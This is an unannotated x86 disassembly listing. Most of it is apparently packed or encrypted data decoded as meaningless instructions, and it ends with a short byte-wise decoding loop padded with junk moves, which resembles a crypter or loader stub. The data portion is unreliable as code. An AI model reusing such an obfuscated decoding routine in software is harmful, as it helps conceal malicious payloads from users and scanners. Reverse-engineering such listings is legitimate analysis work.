  417c19:	das    
  417c1a:	push   ds
  417c1b:	ins    DWORD PTR es:[edi],dx
  417c1c:	adc    al,0x7
  417c1e:	lock stos DWORD PTR es:[edi],eax
  417c20:	add    dl,BYTE PTR [esi]
  417c22:	push   edx
  417c23:	(bad)  [ecx+0x50]
  417c26:	mov    ebp,esi
  417c28:	icebp  
  417c29:	stos   BYTE PTR es:[edi],al
  417c2a:	shl    BYTE PTR [edx-0x14],cl
  417c2d:	arpl   WORD PTR [eax-0x59614bf5],dx
  417c33:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  417c35:	clc    
  417c36:	rcr    BYTE PTR [eax+0x21c6f03f],cl
  417c3c:	push   0x51
  417c3e:	or     BYTE PTR [eax],0x18
  417c41:	sbb    DWORD PTR [eax+0x5bfa3fd],edi
  417c47:	aam    0x4c
  417c49:	pop    ss
  417c4a:	mov    esp,0xa4c2a85a
  417c4f:	or     esp,eax
  417c51:	pop    ebp
  417c52:	pop    ss
  417c53:	jecxz  0x417c37
  417c55:	rcl    BYTE PTR ds:0x5d0506e5,cl
  417c5b:	inc    ebp
  417c5c:	ins    DWORD PTR es:[edi],dx
  417c5d:	cdq    
  417c5e:	jle    0x417cc3
  417c60:	jne    0x417cb7
  417c62:	leave  
  417c63:	cmp    al,0xed
  417c65:	and    ah,al
  417c67:	push   ebp
  417c68:	jle    0x417cb4
  417c6a:	and    al,0x75
  417c6c:	imul   ecx,DWORD PTR [edi+0x19125217],0x7ef35aa5
  417c76:	push   0xc24f5d2d
  417c7b:	gs clc 
  417c7d:	daa    
  417c7e:	out    0x6f,al
  417c80:	pusha  
  417c81:	push   ebx
  417c82:	bound  ecx,QWORD PTR [edi]
  417c84:	inc    esp
  417c85:	xchg   ebx,eax
  417c86:	or     BYTE PTR [ecx],0x3c
  417c89:	mov    dl,0x10
  417c8b:	add    DWORD PTR [edx-0x28],edi
  417c8e:	push   ss
  417c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c90:	mov    esi,0xa6120a23
  417c95:	xor    eax,0xdbf34f2f
  417c9a:	jb     0x417c23
  417c9c:	ins    DWORD PTR es:[edi],dx
  417c9d:	or     eax,0x4bef47ed
  417ca2:	stc    
  417ca3:	imul   edx,DWORD PTR [ebx-0x76d5269c],0xd31f0b6c
  417cad:	inc    BYTE PTR [esi+edx*8-0x36516df7]
  417cb4:	and    edx,eax
  417cb6:	lea    edi,[edx+0x0]
  417cb9:	ficomp DWORD PTR [edi]
  417cbb:	xchg   BYTE PTR [esi+0x5db17ba4],dl
  417cc1:	mov    bl,0xce
  417cc3:	js     0x417cfe
  417cc5:	push   eax
  417cc6:	out    dx,al
  417cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cc8:	add    cl,0xa3
  417ccb:	push   esp
  417ccc:	mov    dl,0x16
  417cce:	in     eax,dx
  417ccf:	lods   al,BYTE PTR ds:[esi]
  417cd0:	cs popa 
  417cd2:	outs   dx,DWORD PTR ds:[esi]
  417cd3:	xchg   bh,dl
  417cd5:	gs (bad) 
  417cd7:	les    ebx,FWORD PTR [ebx+0x17052513]
  417cdd:	jne    0x417d0a
  417cdf:	xchg   BYTE PTR [esi+0x1e45235f],ah
  417ce5:	cmp    BYTE PTR [esi-0xeb67de6],ch
  417ceb:	imul   ebx,DWORD PTR ds:0x36f9649c,0x50
  417cf2:	xor    BYTE PTR [ecx+0x42],dh
  417cf5:	adc    eax,DWORD PTR [ebp+0x6d]
  417cf8:	xlat   BYTE PTR ds:[ebx]
  417cf9:	xchg   edx,eax
  417cfa:	loopne 0x417d70
  417cfc:	test   BYTE PTR [ebx+0x52b5f456],bh
  417d02:	mov    bh,ch
  417d04:	xor    BYTE PTR [edx],ah
  417d06:	jbe    0x417ce2
  417d08:	sbb    DWORD PTR [ebp-0x65690944],ecx
  417d0e:	xchg   edx,eax
  417d0f:	out    dx,eax
  417d10:	aas    
  417d11:	mov    edx,0xd3f7e440
  417d16:	jle    0x417d37
  417d18:	inc    ebp
  417d19:	outs   dx,DWORD PTR ds:[esi]
  417d1a:	dec    esp
  417d1b:	mov    DWORD PTR [ebx-0x23a70e9],esi
  417d21:	vmwrite ecx,DWORD PTR [eax-0x59858bfa]
  417d28:	push   edi
  417d29:	push   0xd3d859e9
  417d2e:	sbb    ch,bl
  417d30:	ss call 0xcffc4be6
  417d36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d37:	stc    
  417d38:	or     bl,ah
  417d3a:	popa   
  417d3b:	xchg   ebx,eax
  417d3c:	test   eax,0x16f2ebc9
  417d41:	mov    DWORD PTR [ecx+0x5f],ecx
  417d44:	inc    eax
  417d45:	rcr    DWORD PTR [edi+0x33],cl
  417d48:	mov    BYTE PTR [edx+esi*1+0x73619cf5],dl
  417d4f:	retf   0x9f7e
  417d52:	xchg   edx,eax
  417d53:	mov    dh,0x68
  417d55:	retf   0x1f79
  417d58:	aas    
  417d59:	sub    ecx,DWORD PTR [esp+edi*2-0x23ba5318]
  417d60:	xchg   ebx,eax
  417d61:	dec    eax
  417d62:	ss xchg edi,eax
  417d64:	ret    
  417d65:	adc    BYTE PTR [ebx+0x366d9393],ah
  417d6b:	daa    
  417d6c:	sti    
  417d6d:	pusha  
  417d6e:	jnp    0x417d61
  417d70:	ficom  WORD PTR [edi-0x22128d94]
  417d76:	pop    esp
  417d77:	aaa    
  417d78:	(bad)
  417d7b:	xor    BYTE PTR [esi],0x3
  417d7e:	and    eax,ecx
  417d80:	mov    bl,0xda
  417d82:	pop    ebp
  417d83:	mov    ch,0x5f
  417d85:	mov    eax,ebx
  417d87:	cmp    ebp,edx
  417d89:	(bad)  
  417d8a:	imul   eax,DWORD PTR [ecx],0xffffff95
  417d8d:	sar    DWORD PTR [ecx-0x56fea5a8],cl
  417d93:	inc    ebp
  417d94:	fs push edx
  417d96:	popa   
  417d97:	xor    al,0xa4
  417d99:	jle    0x417d42
  417d9b:	std    
  417d9c:	not    DWORD PTR [ebx+0x2f28078a]
  417da2:	add    eax,DWORD PTR [ebp-0x35e016a5]
  417da8:	and    al,0xf3
  417daa:	sti    
  417dab:	xchg   esp,eax
  417dac:	cmp    ch,BYTE PTR [ebp+0x56]
  417daf:	xchg   ebx,eax
  417db0:	pop    esi
  417db1:	sar    ch,1
  417db3:	xor    esp,DWORD PTR [eax+0x48]
  417db6:	in     eax,dx
  417db7:	inc    ebp
  417db8:	retf   
  417db9:	dec    ecx
  417dba:	or     edi,DWORD PTR [ebx]
  417dbc:	mov    dl,0x39
  417dbe:	sbb    BYTE PTR [edi+0x9fdccba],dh
  417dc4:	fistp  DWORD PTR [edx-0x72]
  417dc7:	and    al,0x7c
  417dc9:	xchg   DWORD PTR [edi-0x69],eax
  417dcc:	out    dx,eax
  417dcd:	lds    ebp,FWORD PTR [esi-0xe]
  417dd0:	mov    cl,0x9
  417dd2:	je     0x417dd1
  417dd4:	and    al,0xa8
  417dd6:	jecxz  0x417e20
  417dd8:	fist   WORD PTR [ecx]
  417dda:	dec    ebx
  417ddb:	mov    bh,0xc8
  417ddd:	pop    eax
  417dde:	cmp    BYTE PTR [edx-0x7],ch
  417de1:	ror    bh,cl
  417de3:	push   0xffffffd8
  417de5:	arpl   WORD PTR ds:0x35cd8014,ax
  417deb:	mov    cl,0x73
  417ded:	outs   dx,DWORD PTR ds:[esi]
  417dee:	or     BYTE PTR [edi],0x2d
  417df1:	cmc    
  417df2:	mov    ds:0xb0556b16,eax
  417df7:	shl    DWORD PTR [ebx+edi*1],cl
  417dfa:	inc    eax
  417dfb:	or     dl,cl
  417dfd:	enter  0xa812,0x93
  417e01:	push   0x758b6b70
  417e06:	cld    
  417e07:	call   esi
  417e09:	mov    DWORD PTR [ebp-0x3c],eax
  417e0c:	cmp    DWORD PTR [ebp-0x3c],0x57
  417e10:	jne    0x417e1e
  417e12:	mov    edx,DWORD PTR [ebp-0x24]
  417e15:	push   edx
  417e16:	call   0x401000
  417e1b:	add    esp,0x4
  417e1e:	xor    eax,eax
  417e20:	pop    esi
  417e21:	mov    esp,ebp
  417e23:	pop    ebp
  417e24:	ret    
  417e25:	push   ebp
  417e26:	mov    ebp,esp
  417e28:	sub    esp,0x124
  417e2e:	xor    eax,eax
  417e30:	mov    esp,ebp
  417e32:	pop    ebp
  417e33:	ret    
  417e34:	push   ebp
  417e35:	mov    ebp,esp
  417e37:	sub    esp,0x2c
  417e3a:	push   ebx
  417e3b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  417e42:	mov    DWORD PTR [ebp-0xc],0x0
  417e49:	mov    DWORD PTR [ebp-0x20],0x1
  417e50:	mov    DWORD PTR [ebp-0x10],0x0
  417e57:	mov    eax,DWORD PTR [ebp+0xc]
  417e5a:	mov    DWORD PTR [ebp-0x1c],eax
  417e5d:	mov    DWORD PTR [ebp-0x18],0x0
  417e64:	mov    DWORD PTR [ebp-0x8],0x0
  417e6b:	mov    DWORD PTR [ebp-0x24],0x0
  417e72:	mov    ecx,DWORD PTR [ebp-0x4]
  417e75:	sub    ecx,0x1
  417e78:	mov    DWORD PTR [ebp-0x4],ecx
  417e7b:	mov    edx,DWORD PTR [ebp+0x8]
  417e7e:	mov    DWORD PTR [ebp-0x10],edx
  417e81:	mov    DWORD PTR [ebp-0x28],0x1
  417e88:	mov    eax,DWORD PTR [ebp-0x4]
  417e8b:	add    eax,0x2
  417e8e:	mov    DWORD PTR [ebp-0x4],eax
  417e91:	mov    ecx,DWORD PTR [ebp-0x1c]
  417e94:	add    ecx,DWORD PTR [ebp-0x4]
  417e97:	mov    dl,BYTE PTR [ecx+0x1]
  417e9a:	mov    BYTE PTR [ebp-0x11],dl
  417e9d:	mov    eax,DWORD PTR [ebp-0x4]
  417ea0:	add    eax,0x1
  417ea3:	mov    DWORD PTR [ebp-0x4],eax
  417ea6:	mov    cl,BYTE PTR [ebp-0x11]
  417ea9:	mov    BYTE PTR [ebp-0x29],cl
  417eac:	push   edx
  417ead:	pop    ebx
  417eae:	mov    ecx,ebx
  417eb0:	mov    edx,DWORD PTR [ebp-0x10]
  417eb3:	add    edx,DWORD PTR [ebp-0x4]
  417eb6:	mov    al,BYTE PTR [ebp-0x29]
  417eb9:	mov    BYTE PTR [edx],al
  417ebb:	mov    ebx,esi
  417ebd:	mov    ecx,DWORD PTR [ebp+0x14]
  417ec0:	add    ecx,DWORD PTR [ebp-0x8]
  417ec3:	movzx  edx,BYTE PTR [ecx]
  417ec6:	mov    DWORD PTR [ebp-0xc],edx
  417ec9:	mov    eax,DWORD PTR [ebp-0x8]
  417ecc:	mov    ecx,DWORD PTR [ebp-0x28]
  417ecf:	add    eax,ecx
  417ed1:	mov    DWORD PTR [ebp-0x8],eax
  417ed4:	mov    eax,DWORD PTR [ebp-0x8]
  417ed7:	shr    eax,0x3
  417eda:	mov    ecx,0x1
  417edf:	sub    ecx,eax
  417ee1:	mov    DWORD PTR [ebp-0x20],ecx
  417ee4:	shr    eax,cl
  417ee6:	mov    edx,DWORD PTR [ebp-0x8]
  417ee9:	imul   edx,DWORD PTR [ebp-0x20]
  417eed:	mov    DWORD PTR [ebp-0x8],edx
  417ef0:	shl    ebx,0x3
  417ef3:	mov    eax,DWORD PTR [ebp-0x10]
  417ef6:	add    eax,DWORD PTR [ebp-0x4]
  417ef9:	movzx  ecx,BYTE PTR [eax]
  417efc:	add    ecx,DWORD PTR [ebp-0xc]
  417eff:	mov    edx,DWORD PTR [ebp-0x10]
  417f02:	add    edx,DWORD PTR [ebp-0x4]
  417f05:	mov    BYTE PTR [edx],cl
  417f07:	mov    eax,DWORD PTR [ebp-0x4]
  417f0a:	sub    eax,0x2
  417f0d:	mov    DWORD PTR [ebp-0x4],eax
  417f10:	mov    ecx,DWORD PTR [ebp-0x4]
  417f13:	cmp    ecx,DWORD PTR [ebp+0x10]
  417f16:	jl     0x417e88
  417f1c:	pop    ebx
  417f1d:	mov    esp,ebp
  417f1f:	pop    ebp
  417f20:	ret    
  417f21:	int3   
  417f22:	jmp    DWORD PTR ds:0x418008
